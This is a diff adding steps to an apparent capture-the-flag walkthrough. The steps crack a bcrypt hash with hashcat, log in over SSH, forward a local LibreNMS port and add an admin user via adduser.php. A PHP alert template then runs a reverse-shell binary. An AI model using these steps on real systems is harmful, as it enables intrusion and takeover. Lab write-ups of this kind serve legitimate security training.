@@ -242,6 +242,59 @@ after db.users.find() to see all the data inside:
 
 and we get 2 users
 
+taking the hash of frank_dorky to hashcat:
+   hashcat -m 3200 -a 0 franky.txt /usr/share/wordlists/rockyou.txt
+
+its cracked as $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6:manchesterunited
+
+now lets try to connect via ssh with this username
+
+and we succeed
+
+getting the userflag:
+    05c324776b5f97cf2ba40a5220f9ab9c
+
+using linpeas we found out that there is some port 3000 is listening
+
+making portforwarding using:
+    ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6 
+
+and using browser to enter the page
+
+inside the page there is a login librenms page
+
+using frank_dorky credentials to enter
+
+finding out that this is a 22.10 VERSION
+
+the librenms is located in /opt directory
+
+    /opt:
+total 12
+drwxr-xr-x  3 root     root     4096 Feb 16 15:21 .
+drwxr-xr-x 19 root     root     4096 Feb 20 16:16 ..
+drwxrwx--x 27 librenms librenms 4096 Feb 19 13:33 librenms
+
+others can execute scripts inside the directory
+
+there is a way to add an admin user to this directory 
+
+https://community.librenms.org/t/adding-admin-users-on-librenms/20782
+
+/opt/librenms/adduser.php <username> <password> 10 <--- admin level permissions
+User testadmin added successfully
+
+now lets try to connect 
+
+and we get the admin panel
+
+now we can upload a reverse shell and trigger it
+
+in Alerts Tab we can create a new template with:
+@php
+system("/tmp/r45");
+@endphp
+
 
 
 
